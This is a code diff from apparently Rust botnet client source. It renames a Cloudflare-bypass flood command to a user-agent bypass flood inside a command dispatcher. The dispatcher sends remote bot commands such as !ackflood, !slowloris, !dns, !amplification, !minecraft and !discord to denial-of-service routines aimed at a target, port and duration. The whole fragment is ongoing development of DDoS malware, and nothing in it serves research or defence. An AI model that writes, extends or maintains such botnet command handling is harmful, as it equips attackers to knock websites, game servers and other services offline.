@@ -261,7 +261,7 @@ async fn handle_command(command: &str, state: Arc<BotState>) -> Result<()> {
         "!ackflood" | "!greflood" | "!dns" | "!dnsl4" | "!http" |
         "!slowloris" | "!sslflood" | "!websocket" | "!icmpflood" |
         "!amplification" | "!connection" |
-        "!vse" | "!ovh" | "!cfbypass" | "!stress" |
+        "!vse" | "!ovh" | "!ua" | "!stress" |
         "!minecraft" | "!raknet" | "!fivem" | "!ts3" | "!udpmax" |
         "!discord" | "!sip" => {
             handle_attack_command(cmd, &fields, state).await?;
@@ -340,7 +340,7 @@ async fn handle_v2_attack_command(fields: &[&str], state: Arc<BotState>) -> Resu
             "VSE" => { attack_methods::vse_flood(&target, port, duration).await; Ok(()) },
             "OVH" | "NFO" | "BYPASS" => { attack_methods::ovh_flood(&target, port, duration).await; Ok(()) },
             "HTTP" => { attack_methods::http_flood(&target, port, duration).await; Ok(()) },
-            "CFBYPASS" | "CF" => { attack_methods::cf_bypass_flood(&target, port, duration).await; Ok(()) },
+            "UA" | "UA-HTTP" => { attack_methods::ua_bypass_flood(&target, port, duration).await; Ok(()) },
             "SLOWLORIS" => { attack_methods::slowloris(&target, port, duration).await; Ok(()) },
             "STRESS" => { attack_methods::http_stress(&target, port, duration).await; Ok(()) },
             "MINECRAFT" => { attack_methods::minecraft_flood(&target, port, duration).await; Ok(()) },
@@ -502,8 +502,8 @@ async fn handle_attack_command(cmd: &str, fields: &[&str], state: Arc<BotState>)
                 attack_methods::ovh_flood(&target, port, duration).await;
                 Ok(())
             }
-            "!cfbypass" => {
-                attack_methods::cf_bypass_flood(&target, port, duration).await;
+            "!ua" => {
+                attack_methods::ua_bypass_flood(&target, port, duration).await;
                 Ok(())
             }
             "!stress" => {
